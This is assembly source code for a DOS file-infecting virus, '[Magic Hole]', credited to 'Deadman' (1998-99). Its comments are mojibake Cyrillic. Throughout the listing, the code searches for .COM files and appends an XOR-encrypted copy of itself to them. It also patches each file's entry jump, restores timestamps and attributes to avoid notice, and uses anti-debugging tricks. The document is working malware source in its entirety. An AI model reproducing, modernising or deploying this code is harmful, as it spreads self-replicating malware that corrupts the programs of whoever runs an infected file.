    jumps
   .model tiny
   .code
    start:
    ; *â® ¬¥âª  ® § à ¦¥¨¨
           db      0e9h,0,0,98h

    ; ‘®åà ¨¬ à¥£¨áâàë
           push    ax bx cx dx bp si di

    ; ‡ £àã§¨¬ bp § ç¥¨¥¬ ¤®¯®«¨â¥«ì®£® á¬¥é¥¨ï
           int    1ch
    delta:
           cli
           mov     bp,sp
           mov     bp,word ptr [bp-6]
           sub     bp,offset delta
           sti

    ; *â® ¯à®â¨¢ ¢š¥¡ 
           mov     ax,1200h
           int     2fh
           cmp     al,0ffh
           sbb     ch,ch
           mov     cl,1
           lea     di,[stosed+bp]
           mov     al,90h
           rep     stosb
    stosed:
           nop

    ; * áè¨äà®¢ë¢ ¥¬ ¢¨àãá
           mov     cx,vsize-(cbeg-start)
           lea     si,[cbeg+bp]
    decrypt:
           dw      3480h
    key    db      0000h
           inc     si
           loop    decrypt

    ; ‚®ááâ ®¢¨¬ ®à¨£¨ «ì®¥  ç «® ä ©« 
    cbeg:
           lea     si,[prev+bp]
           mov     di,100h
           mov     cx,4
           rep     movsb

    ; *à®¢¥àï¥¬, ¥ á £¨¡ª¨¬ «¨ ¤¨áª®¬ ¬ë ¨¬¥¥¬ ¤¥«®?
           mov     ax,4408h
           xor     bx,bx
           int     21h
           or      ax,ax
           jz      complete

    ; “áâ ®¢¨¬  ¤à¥á ®¢®£® dta
           mov     ah,1ah
           lea     dx,[dta+bp]
           int     21h

    ; *à¨áâã¯ ¥¬ ª ¯®¨áªã ä ©«®¢
           mov     ah,4eh
           mov     cx,0ffefh and (not 1000b)
           lea     dx,[fmask+bp]
    get_file:
           int     21h
           jc      no_more
           call    infect
           mov     ah,4fh
           jmp     get_file

    ; ‚®ááâ  ¢«¨¢ ¥¬ dta
    no_more:
           mov     ah,1ah
           mov     dx,80h
           int     21h

    ; ‚®ááâ  ¢«¨¢ ¥¬ à¥£¨áâàë
    complete:
           pop     di si bp dx cx bx ax

    ; Žâ¤ ¤¨¬ ã¯à ¢«¥¨¥ ¢¨àãá®®á¨â¥«î
           mov     si,100h
           jmp     far ptr si

    prev   db      0c3h,0,0,98h
    jump   db      0e9h,0,0,98h
    fmask  db      '*.com',0

           db      '[Magic Hole]',0
           db      'Copyright (C) 1998-99 by Deadman for Ksenia Chizhova',0
           db      'There is nothing easier then to fall in love. Deadman.',0
           db      '{ALCY}'


    ; ˆä¨æ¨àã¥¬ DS:DX ---------- ;(
    infect:
           cmp     word ptr [fsize+2+bp],0
           jnz     unluck
           cmp     word ptr [fsize+bp],60000
           ja      unluck

           mov     ax,3d00h
           lea     dx,[fname+bp]
           int     21h
           jc      unluck

           xchg    ax,bx
           mov     ah,3fh
           mov     cx,4
           lea     dx,[prev+bp]
           int     21h
           jc      close_1
           xor     cx,ax
           jnz     close_1

           cmp     byte ptr [prev+3+bp],98h
           jnz     not_infected

    close_1:
           call    close
           jmp     unluck

    not_infected:
           call    close

           mov     ax,4301h
           xor     cx,cx
           lea     dx,[fname+bp]
           int     21h
           jc      unluck
           mov     ax,3d02h
           int     21h
           jc      unluck

           xchg    ax,bx
           mov     ax,4202h
           xor     cx,cx
           cwd
           int     21h
           jc      close_2

    no_zero:
           in      al,40h
           or      al,al
           jz      no_zero
           mov     byte ptr [key+bp],al

           lea     si,[start+bp]
           lea     di,[buffer+bp]
           mov     cx,vsize
           cld
           rep     movsb

           lea     si,[buffer+(cbeg-start)+bp]
           mov     cx,vsize-(cbeg-start)
    encrypt:
           xor     byte ptr [si],al
           inc     si
           loop    encrypt

           mov     ah,40h
           mov     cx,vsize
           lea     dx,[buffer+bp]
           int     21h
           jc      close_2
           xor     cx,ax
           jnz     close_2

           xor     ax,ax
           in      al,40h
           mov     cx,ax
           in      ax,40h
           mov     dx,ax

           mov     ah,40h
           int     21h

           mov     ax,4200h
           xor     cx,cx
           cwd
           int     21h
           mov     ax,word ptr [fsize+bp]
           mov     word ptr [jump+1+bp],ax
           mov     ah,40h
           mov     cx,4
           lea     dx,[jump+bp]
           int     21h

    close_2:
           mov     ax,5700h
           inc     al
           mov     cx,[time+bp]
           mov     dx,[date+bp]
           int     21h
           call    close
           mov     ax,4300h
           inc     al
           mov     cl,byte ptr [attr+bp]
           mov     ch,0
           lea     dx,[fname+bp]
           int     21h

    unluck:
           ret

    close:
           nop
           mov     ah,3eh
           int     21h
           nop
           nop
           ret

    vsize  equ     word ptr offset $ - offset start

    dta    label   byte
           db      15h dup (?)
    attr   db      ?
    time   dw      ?
    date   dw      ?
    fsize  dw      ?,?
    fname  db      13 dup (?)

    buffer db      vsize dup (?)

           end     start
